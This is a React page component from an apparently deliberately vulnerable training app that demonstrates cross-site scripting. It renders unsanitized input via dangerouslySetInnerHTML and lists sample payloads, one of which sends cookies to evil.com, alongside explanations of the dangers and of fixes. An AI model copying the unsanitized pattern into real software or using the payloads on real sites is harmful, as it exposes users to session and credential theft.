import { useState } from 'react';
import Link from 'next/link';

export default function XSSDemo() {
  const [userInput, setUserInput] = useState('');
  const [displayContent, setDisplayContent] = useState('');

  const handleSubmit = (e) => {
    e.preventDefault();
    // VULNERABILITY: Directly setting user input as HTML without sanitization
    setDisplayContent(userInput);
  };

  return (
    <div style={{ padding: '50px', fontFamily: 'Arial, sans-serif' }}>
      <Link href="/">← Back to Home</Link>

      <h1>Cross-Site Scripting (XSS) Vulnerability</h1>

      <div style={{ backgroundColor: '#ffebee', padding: '20px', marginBottom: '20px', border: '1px solid #f44336' }}>
        <h2>⚠️ Vulnerability: dangerouslySetInnerHTML</h2>
        <p>
          This page uses React's <code>dangerouslySetInnerHTML</code> without proper sanitization,
          allowing attackers to inject malicious scripts.
        </p>
      </div>

      <h2>Try It:</h2>
      <form onSubmit={handleSubmit}>
        <div>
          <label>Enter HTML content:</label><br />
          <textarea
            value={userInput}
            onChange={(e) => setUserInput(e.target.value)}
            rows="5"
            cols="60"
            style={{ marginTop: '10px', padding: '10px' }}
            placeholder="Try: <img src=x onerror=alert('XSS')>"
          />
        </div>
        <button type="submit" style={{ marginTop: '10px', padding: '10px 20px', cursor: 'pointer' }}>
          Render Content
        </button>
      </form>

      <h2>Output:</h2>
      <div
        style={{
          border: '1px solid #ccc',
          padding: '20px',
          marginTop: '20px',
          minHeight: '100px',
          backgroundColor: '#f5f5f5'
        }}
        // VULNERABILITY: dangerouslySetInnerHTML without sanitization
        dangerouslySetInnerHTML={{ __html: displayContent }}
      />

      <div style={{ marginTop: '30px', backgroundColor: '#e3f2fd', padding: '20px', border: '1px solid #2196f3' }}>
        <h3>Example Exploits:</h3>
        <ul>
          <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code> - Basic XSS alert</li>
          <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> - Script injection</li>
          <li><code>&lt;img src=x onerror="fetch('https://evil.com?cookie='+document.cookie)"&gt;</code> - Cookie theft</li>
          <li><code>&lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;</code> - Event handler XSS</li>
        </ul>

        <h3>Why This Is Dangerous:</h3>
        <ul>
          <li>Attackers can steal session cookies and authentication tokens</li>
          <li>Can perform actions on behalf of the victim user</li>
          <li>Can redirect users to phishing sites</li>
          <li>Can modify page content to spread misinformation</li>
        </ul>

        <h3>How to Fix:</h3>
        <ul>
          <li>Avoid using <code>dangerouslySetInnerHTML</code> whenever possible</li>
          <li>If you must render HTML, use a library like DOMPurify to sanitize input</li>
          <li>Implement Content Security Policy (CSP) headers</li>
          <li>Use React's default JSX rendering which auto-escapes content</li>
          <li>Validate and sanitize all user input on both client and server</li>
        </ul>
      </div>
    </div>
  );
}
